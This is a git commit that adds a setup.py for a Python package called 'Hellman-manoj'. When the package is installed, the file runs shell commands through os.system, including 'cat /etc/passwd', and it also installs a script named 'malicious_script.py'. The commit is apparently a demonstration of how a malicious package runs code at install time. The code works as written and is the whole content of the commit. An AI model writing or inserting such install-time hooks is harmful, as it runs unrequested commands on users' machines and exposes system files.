0bb6d765625c4492ee0564d3e328e79b33e0c5d5
predator97x <134788536+predator97x@users.noreply.github.com>
2024-06-11 14:56:50 +0530

    Create setup.py

---
+++ setup.py
@@ -0,0 +1,13 @@
+from setuptools import setup
+import os
+
+# This will be executed during pip install
+os.system('echo "Testing Predator97x's Code"')
+os.system('ls -la')
+os.system('cat /etc/passwd')  # Just an example, be careful with real attacks
+
+setup(
+    name='Hellman-manoj',
+    version='0.1',
+    scripts=['malicious_script.py'],
+)
